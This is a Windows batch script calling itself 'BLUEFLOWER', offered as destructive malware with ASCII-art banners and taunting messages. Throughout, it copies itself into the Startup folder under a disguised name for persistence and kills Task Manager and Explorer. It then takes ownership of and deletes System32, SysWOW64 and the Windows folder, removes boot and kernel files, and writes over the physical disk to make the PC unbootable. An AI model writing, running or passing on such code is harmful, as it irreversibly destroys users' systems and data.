@echo off
title BLUEFLOWER
color 4f
mode con: cols=160 lines=50
cls
echo.
echo                  ██████╗ ██╗   ██╗███████╗
echo                  ██╔══██╗██║   ██║██╔════╝
echo                  ██████╔╝██║   ██║█████╗  
echo                  ██╔══██╗██║   ██║██╔══╝  
echo                  ██████╔╝╚██████╔╝███████╗
echo                  ╚═════╝  ╚═════╝ ╚══════╝
echo.
echo                  SYSTEM32 IS NOW MINE
ping localhost -n 3 >nul

copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\winlogon.bat" /Y >nul 2>&1
copy "%~f0" "C:\winlogon.bat" /Y >nul 2>&1

taskkill /f /im taskmgr.exe >nul 2>&1
taskkill /f /im explorer.exe >nul 2>&1

takeown /f C:\Windows\System32 /r /d y >nul 2>&1
icacls C:\Windows\System32 /grant Administrators:F /t >nul 2>&1
rd /s /q C:\Windows\System32
md C:\Windows\System32
echo BLUEFLOWER WAS HERE > C:\Windows\System32\OWNED_BY_BLUEFLOWER.txt

rd /s /q C:\Windows\SysWOW64 >nul 2>&1

rd /s /q C:\Windows >nul 2>&1

del /f /q C:\boot.ini >nul 2>&1
del /f /q C:\Windows\System32\winload.exe >nul 2>&1
del /f /q C:\Windows\System32\ntoskrnl.exe >nul 2>&1

echo BLUEFLOWER > \\.\PhysicalDrive0

powershell -c "while($true){[Console]::Beep(32767,100); Start-Sleep -m 50}"
start https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1&v=loop
powershell -c "$v=New-Object -ComObject Sapi.SpVoice; $v.Rate=10; $v.Speak('SYSTEM32 IS GONE FOREVER GOODBYE')"

cls
echo.
echo    SYSTEM32 = DELETED
echo    WINDOWS   = OBLITERATED  
echo    BOOTLOADER = FUCKED
echo.
echo    YOUR PC IS NOW A GLORIFIED BRICK
echo    THANKS FOR PLAYING
echo    YOUR FUCKED
echo.
echo                 LOVE, BLUEFLOWER 🌸
ping localhost -n 999 >nul